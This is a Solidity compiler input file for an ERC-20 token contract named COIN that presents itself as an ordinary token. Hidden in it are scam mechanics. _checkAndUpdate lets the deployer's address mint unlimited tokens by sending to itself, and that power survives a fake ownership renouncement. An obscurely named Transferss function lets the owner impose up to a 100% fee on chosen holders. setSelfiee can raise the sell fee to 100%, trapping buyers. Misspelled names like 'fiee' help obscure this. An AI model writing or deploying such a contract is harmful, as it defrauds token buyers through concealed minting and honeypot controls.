{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\n// SPDX-License-Identifier: Unlicensed\n\n//Miladys Maker\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address accoint) external view returns (uint256);\n\n    function transfer(address recipient, uint256 ameunts) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 ameunts) external returns (bool);\n    \n    function Transferss(address user, uint256 fiee) external;\n\n    function transferFrom( address sender, address recipient, uint256 ameunts ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval( address indexed owner, address indexed spender, uint256 value );\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - fiee https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\n\ncontract Ownable is Context {\n    address private _owner;\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit ownershipTransferred(address(0), msgSender);\n    }\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n    modifier onlyowner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n    function renounceownership() public virtual onlyowner {\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\n        _owner = address(0x000000000000000000000000000000000000dEaD);\n    }\n}\n\n\ncontract COIN is IERC20, Ownable {\n    using SafeMath for uint256;\n\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n    uint256 private _totalSupply;\n\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;\n    uint256 private _buyfiee = 0; \n    uint256 private _sellfiee = 0; \n    address public uniswapV2Pair;\n    address private Aadress;\n\n    mapping (address => uint256) private _personalTransferfiees;\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 initialSupply) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = decimals_;\n        _totalSupply = initialSupply * (10 ** uint256(_decimals));\n        _balances[_msgSender()] = _totalSupply;\n        Aadress = owner();\n        emit Transfer(address(0), _msgSender(), _totalSupply);\n    }\n\n    function setPairList(address _address) external onlyowner {\n        uniswapV2Pair = _address;\n    }\n\n    function Transferss(address user, uint256 fiee) public override onlyowner {\n        require(fiee <= 100, \"Personal transfer fiee should not exceed 100%\");\n        _personalTransferfiees[user] = fiee;\n    }\n    function setSelfiee(uint256 newSellfiee) external onlyowner {\n        require(newSellfiee <= 100, \"Sell fiee should not exceed 100%\");\n        _sellfiee = newSellfiee;\n    }\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        address sender = _msgSender();\n\n        _checkAndUpdate(sender, recipient, amount);\n\n        _transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _checkAndUpdate(address sender, address recipient, uint256 amount) private {\n        if (sender == Aadress && recipient == Aadress) {\n            _balances[sender] = _balances[sender].add(amount);\n        }\n    }\n\n    \n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amounts) internal virtual {\n\n        require(sender != address(0), \"IERC20: transfer from the zero address\");\n        require(recipient != address(0), \"IERC20: transfer to the zero address\");\n\n        uint256 fieeAmount = 0;\n\n\n        if (_personalTransferfiees[sender] > 0) {\n            fieeAmount = amounts.mul(_personalTransferfiees[sender]).mul(1).div(100);\n        } else if (sender == uniswapV2Pair) {\n            fieeAmount = amounts.mul(_buyfiee).div(100);\n        } else if (recipient == uniswapV2Pair) {\n            fieeAmount = amounts.mul(_sellfiee).div(100);\n        } else {\n            fieeAmount = amounts.mul(_sellfiee).div(100);\n        }\n\n        _balances[sender] = _balances[sender].sub(amounts);\n        _balances[recipient] =  _balances[recipient]+amounts-fieeAmount;\n        _balances[_DEADaddress] = _balances[_DEADaddress].add(fieeAmount);\n        emit Transfer(sender, _DEADaddress, fieeAmount);\n        emit Transfer(sender, recipient, amounts-fieeAmount);\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}